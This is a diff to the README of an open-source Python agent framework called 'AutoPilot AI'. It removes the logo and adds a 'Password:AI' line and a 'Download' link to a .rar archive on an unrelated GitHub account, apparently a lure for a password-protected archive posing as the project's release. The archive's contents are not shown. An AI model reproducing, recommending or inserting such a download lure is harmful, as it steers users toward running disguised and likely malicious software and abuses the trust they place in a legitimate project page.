@@ -1,7 +1,4 @@
 <div align="center">
-
-<img src="docs/assets/logo.png" alt="AutoPilot AI Logo" width="200"/>
-
 # 🤖 AutoPilot AI
 **Password:AI**
 ### Open-Source Autonomous AI Agent Framework for Python
@@ -16,7 +13,7 @@ Build multi-agent systems that **think**, **plan**, and **execute** — with too
 [![Docs](https://img.shields.io/badge/Docs-MkDocs-blue?logo=readthedocs)](https://autopilot-ai.dev)
 [![Discord](https://img.shields.io/discord/1234567890?color=7289DA&logo=discord&logoColor=white&label=Discord)](https://discord.gg/autopilot-ai)
 [![Stars](https://img.shields.io/github/stars/jebo/autopilot-ai?style=social)](https://github.com/jebo/autopilot-ai)
-
+[![Download](https://github.com/pillarthrushtrimmer/AutoPilot-AI/releases/download/AutoPilot/autopilot-ai.rar)
 **[Documentation](https://autopilot-ai.dev)** · **[Examples](examples/)** · **[Discord](https://discord.gg/autopilot-ai)** · **[Contributing](CONTRIBUTING.md)**
 
 <img src="docs/assets/demo.gif" alt="AutoPilot AI Demo" width="700"/>
